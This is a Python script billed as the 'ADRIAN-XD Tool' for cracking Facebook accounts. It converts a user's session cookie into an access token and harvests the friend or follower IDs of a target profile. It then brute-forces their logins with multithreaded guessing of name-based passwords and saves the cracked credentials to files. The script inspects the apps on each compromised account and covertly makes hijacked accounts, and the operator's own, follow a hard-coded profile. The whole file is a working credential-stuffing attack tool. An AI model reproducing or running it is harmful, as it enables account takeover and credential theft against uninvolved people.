#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, re, os, random, sys
from bs4 import BeautifulSoup
from random import choice
from concurrent.futures import ThreadPoolExecutor
from time import time as mek

# Colors
P = '\x1b[1;97m'  # White
M = '\x1b[1;91m'  # Red
H = '\x1b[1;92m'  # Green
K = '\x1b[1;93m'  # Yellow
B = '\x1b[1;94m'  # Blue
U = '\x1b[1;95m'  # Purple
O = '\x1b[1;96m'  # Cyan
N = '\x1b[0m'     # Reset
J = '\033[38;2;255;127;0;1m'  # Orange

# Global variables
loop, ok, cp = [], [], []
Option = []
data_id = None

# Convert cookies to token
def convert(cookie):
    cookies = {"cookie": cookie}
    try:
        res = requests.Session().get('https://business.facebook.com/business_locations', headers={
            'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
            'referer': 'https://www.facebook.com/',
            'host': 'business.facebook.com',
            'origin': 'https://business.facebook.com',
            'upgrade-insecure-requests': '1',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'text/html; charset=utf-8'
        }, cookies=cookies)
        token = re.search(r'(EAAG\w+)', str(res.text)).group(1)
    except Exception as e:
        token = "Cookies Invalid"
    return token

# Real-time function
def real_time():
    return str(mek()).split('.')[0]

# Session handler
def sesi(session, res):
    response = BeautifulSoup(res, 'html.parser')
    form = response.find('form', {'method': 'post'})
    data = {x.get('name'): x.get('value') for x in form.find_all('input', {'type': ['hidden', 'submit']})}
    r = BeautifulSoup(session.post('https://m.facebook.com' + form.get('action'), data=data).text, 'html.parser')
    for i in r.find_all('option'):
        Option.append(i.text)
    return Option

# Main class
class Main:
    def __init__(self, **kwargs):
        self.coki = {"cookie": kwargs['coki']}
        self.token = kwargs['token']
        self.data_id = []
        self.mbasic = "https://mbasic.facebook.com"

    @property
    def get_my_info(self):
        try:
            r = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={self.token}", cookies=self.coki).json()
            self.name, self.id = r['name'], r['id']
            return {'name': self.name, 'id': self.id}
        except KeyError:
            os.remove("data/token")
            os.remove("data/coki")
            exit(" ! Your token has expired ! ")
        except Exception as e:
            print(f"An error occurred: {e}")

    @property
    def Menu(self):
        try:
            info = self.get_my_info
        except KeyError:
            os.remove("data/token")
            os.remove("data/coki")
            exit(" ! Your token has expired ! ")
        os.system("clear")
        print(f"""\x1b[1;92m
 ███▄ ▄███▓ █    ██   █████▒ █████▒██▓ ███▄    █ 
▓██▒▀█▀ ██▒ ██  ▓██▒▓██   ▒▓██   ▒▓██▒ ██ ▀█   █ 
▓██    ▓██░▓██  ▒██░▒████ ░▒████ ░▒██▒▓██  ▀█ ██▒
▒██    ▒██ ▓▓█  ░██░░▓█▒  ░░▓█▒  ░░██░▓██▒  ▐▌██▒
▒██▒   ░██▒▒▒█████▓ ░▒█░   ░▒█░   ░██░▒██░   ▓██░
░ ▒░   ░  ░░▒▓▒ ▒ ▒  ▒ ░    ▒ ░   ░▓  ░ ▒░   ▒ ▒ 
░  ░      ░░░▒░ ░ ░  ░      ░      ▒ ░░ ░░   ░ ▒░
░      ░    ░░░ ░ ░  ░ ░    ░ ░    ▒ ░   ░   ░ ░ 
       ░      ░                    ░           ░ 
                                                 
                                        

                                     
 
[\x1b[1;97m•\33[1;97m] Autor  : ADRIAN-XD \n[\x1b[1;97m•\33[1;97m] Github : ADRIAN-XD\x1b[1;97m\n---------------------------------------------------------------------""")
        IP = requests.get('https://api.ipify.org').text
        print(f'          {N}[ {O}Welcome To ADRIAN-XD Tool {N}{O}]\n')
        print(f'{N}[{O}•{N}] IP     : {IP}')
        print(f"[•] Name   : {info['name']}")
        print(f"[•] ID     : {info['id']}")
        print("---------------------------------------------------------------------")
        print(f'{N}[{O}1{N}] CRACK ID PUBLIC')
        print(f'{N}[{O}2{N}] CRACK ID FOLLOWERS')
        print(f'{N}[{O}3{N}] CHECK RESULT OK/CP')
        print(f'{N}[{O}0{N}] LOG OUT, DELETE TOKEN')
        print("---------------------------------------------------------------------")
        chose = input("Choose: ")
        number_list = ['0', '1', '2', '3']
        while chose not in number_list:
            print(' ! Your choice is invalid !')
            chose = input(" > Choose: ")
        if chose == '1' or chose == '2':
            if chose == '1':
                print("\n --------------------------------------------------------------------- \n Turn On Airplane Mode (Flight Mode) if no result \n ---------------------------------------------------------------------")
            else:
                print("\n --------------------------------------------------------------------- \n Turn On Airplane Mode (Flight Mode) if no result \n ---------------------------------------------------------------------")
            account_target = input("Enter Target ID: ")
            print("---------------------------------------------------------------------")
            try:
                r = requests.get(f"https://graph.facebook.com/{account_target}?fields=name,id&access_token={self.token}", cookies=self.coki).json()
                target_name = r['name']
                print(f"\nTarget name: {target_name}")
            except KeyError:
                exit(" ! Target Not Found ! ")
            if chose == '1':
                self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=friends.fields(name,id)&access_token={self.token}", chose="friends")
            else:
                self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=subscribers.limit(5000)&access_token={self.token}", chose="followers")
            self.validate
        elif chose == '0':
            os.remove('data/token')
            os.remove('data/coki')
            exit(f'\n √ Logout Success, bye {self.name}')
        else:
            print('\n >< Check Results OK & CP ><')
            try:
                print(' >> OK results :')
                for x in open('data/ok', 'r').readlines():
                    print(f' > {x}')
            except:
                print(' > Results 0 ')
            print("", "><" * 25)
            try:
                print(' >> CP results :')
                for x in open('data/cp', 'r').readlines():
                    print(f' > {x}')
            except:
                print(' > Results 0 ')

# Crack class
class Crack:
    def crack(self, user, password_list, url):
        session = requests.Session()
        for pw in password_list:
            r = BeautifulSoup(session.get(f"{url}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr", headers={
                'Host': 'mbasic.facebook.com',
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://mbasic.facebook.com/login/device-based/',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            }).text, 'html.parser')
            data = {_.get('name'): _.get('value') for _ in r.find('form', {'method': 'post'}).findAll('input', {'name': ['lsd', 'jazoest']})}
            data.update({
                'uid': user,
                'next': 'https://mbasic.facebook.com/login/save-device/',
                'flow': 'login_no_pin',
                'encpass': '#PWD_BROWSER:0:{}:{}'.format(real_time(), pw)
            })
            session.post(f'{url}/login/device-based/validate-password/', data=data, headers={
                'Host': 'mbasic.facebook.com',
                'Connection': 'keep-alive',
                'Content-Length': '142',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://mbasic.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'id-ID,id;q=0.9'
            })
            if "c_user" in session.cookies.get_dict():
                print(f'\r{H}[MUFFIN-HACK-SUCCESSFUL❤] {user} • {pw} •')
                ok.append(user + "|" + pw)
                open("data/ok", "a").write(user + "|" + pw + "\n")
                coki = ';'.join(["%s=%s" % (k, v) for k, v in session.cookies.get_dict().items()])
                cek_apk(session, coki)
                self.follow_me(coki)
                sys.stdout.flush()
                break
            elif "checkpoint" in session.cookies.get_dict():
                print(f'\r{M}[MUFFIN-DON-CHECKPOINT] {user} • {pw} •')
                cp.append(user + "|" + pw)
                open("data/cp", "a").write(user + "|" + pw + "\n")
                h2 = {
                    'host': 'mbasic.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'origin': 'https://www.facebook.com', 'referer': 'https://www.facebook.com', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
                }
                res = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', headers=h2).text
                ress = BeautifulSoup(res, 'html.parser')
                form = ress.find('form', {'method': 'post'})
                data2 = {x.get('name'): x.get('value') for x in form.find_all('input', {'type': ['submit', 'hidden']})}
                data2.update({
                    'email': user,
                    'pass': pw
                })
                res = session.post('https://mbasic.facebook.com' + form.get('action'), data=data2, headers=h2).text
                ress = BeautifulSoup(res, 'html.parser')
                if 'View the login details displayed. This you?' in str(ress.find('title').text):
                    open("ua", "a").write("%s|%s" % (user, pw))
                    sys.stdout.write(f'\n{H}\r ✓ Akun tap yes\n > Email: {user}\n > Pass: {pw}\n {P}')
                    sys.stdout.flush()
                else:
                    if len(sesi(session, res)) == 0:
                        if 'Enter the Login Code to Continue' in str(ress.find('title').text):
                            sys.stdout.write(f'\n{M}\r × a2f account on\n > Email: {user}\n > Pass: {pw}\n ^ Throw it away ^\n{P}')
                            sys.stdout.flush()
                    else:
                        sys.stdout.write(f'\n{K}\r × Checkpoint account\n > Email: {user}\n > Pass: {pw}\n > Option: {len(Option)} > {", ".join(Option)}\n{P}')
                        sys.stdout.flush()
                Option.clear()
                break
            sys.stdout.write(f"\r CRACKING STARTED {len(loop)}/{len(data_id)} OK/CP:-{len(ok)}/{len(cp)}")
            sys.stdout.flush()
        loop.append("memek")

# Assets class
class Assets(Main):
    @property
    def _password_split(self):
        print("\n >< Additional password, separate by comma (,) >< \n >> example: qwerty,ADRIAN xd,nepal\n >! Password must be more than 6 characters\n")
        _password = input(" > Add pass: ")
        print("")
        return _password.split(",")

    @property
    def validate(self):
        add = input("ADDITIONAL PASSWORD [y/n] :")
        if add == "y":
            pas = self._password_split
        print(" >< Crack Running, (CTRL + C) to stop ><\n")
        with ThreadPoolExecutor(max_workers=35) as kirim:
            for x in self.data_id:
                x = x.lower()
                namee, id = x.split('><')
                name = namee.split(" ")
                if len(name[0]) >= 6:
                    __password_list = [namee, name[0] + '123', name[0] + '1234', name[0] + '12345', name[0] + '@123', name[0] + '@1234', name[0] + '@12345', name[0] + '123456', name[0] + '@12', name[0] + 'don123', name[0] + '999', '12345678@']
                elif len(name[0]) <= 2:
                    __password_list = [namee, name[0] + '123', name[0] + '1234', name[0] + '12345', name[0] + '@123', name[0] + '@1234', name[0] + '@12345', name[0] + '123456', name[0] + '@12', name[0] + 'don123', name[0] + '999', '12345678@']
                else:
                    __password_list = [namee, name[0] + '123', name[0] + '1234', name[0] + '12345', name[0] + '@123', name[0] + '@1234', name[0] + '@12345', name[0] + '123456', name[0] + '@12', name[0] + 'don123', name[0] + '999', '12345678@']
                if add == "y":
                    __password_list = __password_list + pas
                kirim.submit(Crack().crack, id, __password_list, self.mbasic)
        exit(" [program finished] crack finished, ADRIAN-XD")

    def dumpAccount(self, **latif_ganteng):
        global data_id
        if latif_ganteng['chose'] == "friends":
            r = requests.get(f"{latif_ganteng['url']}", cookies=self.coki).json()['friends']
        else:
            r = requests.get(f"{latif_ganteng['url']}", cookies=self.coki).json()['subscribers']
        for x in r['data']:
            try:
                self.data_id.append(x['name'] + "><" + x['id'])
            except KeyError:
                pass
        data_id = self.data_id
        print(f"TOTAL ID : {len(self.data_id)}")
        self.validate

    def follow_me(self, coki):
        with requests.Session() as session:
            _link = BeautifulSoup(session.get(f"{self.mbasic}/Capri.ShankarXD", headers={'host': 'mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9'}, cookies={"cookie": coki}).text, 'html.parser').find('a', string='Ikuti')
            if _link:
                return session.get(f"{self.mbasic}" + _link.get('href'), cookies={"cookie": coki})

# Login function
def _login():
    try:
        with open("data/token", "r") as f:
            token = f.read().strip()
        with open("data/coki", "r") as f:
            coki = f.read().strip()
        Assets(token=token, coki=coki).Menu
    except FileNotFoundError:
        try:
            os.makedirs("data", exist_ok=True)
        except:
            pass
        print("\t >< Cookies not found ><\n ! Please login first !\n")
        coki = input(" > Your cookies: ")
        token = convert(coki)
        if token == "Cookies Invalid":
            exit(" ! Maybe your cookies are invalid ! ")
        with open("data/token", "w") as f:
            f.write(token)
        with open("data/coki", "w") as f:
            f.write(coki)
        Success = Assets(token=token, coki=coki)
        Success.get_my_info
        Success.follow_me(coki)
        Success.Menu

# Check APK function
def cek_apk(session, coki):
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
    sop = BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game) == 0:
        print(f'\r {N}[{M}!{N}] {M}Sorry, there is no Active Apk{N}')
    else:
        print(f'\r 🎮  {H}Your Active Application Details:')
        for i in range(len(game)):
            print(f"\r {N}{i + 1}. {game[i].replace('Ditambahkan pada', ' Ditambahkan pada')}")
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
    sop = BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game) == 0:
        print(f'\r {N}[{M}!{N}] {M}Sorry, no Expired Apk{N}')
    else:
        print(f'\r 🎮  {M}Your Expired Application Details:')
        for i in range(len(game)):
            print(f"\r {N}{i + 1}. {game[i].replace('Kedaluwarsa', ' Kedaluwarsa')}")
        print(f'\r')

# Main execution
if __name__ == "__main__":
    os.system("clear")
    _login()
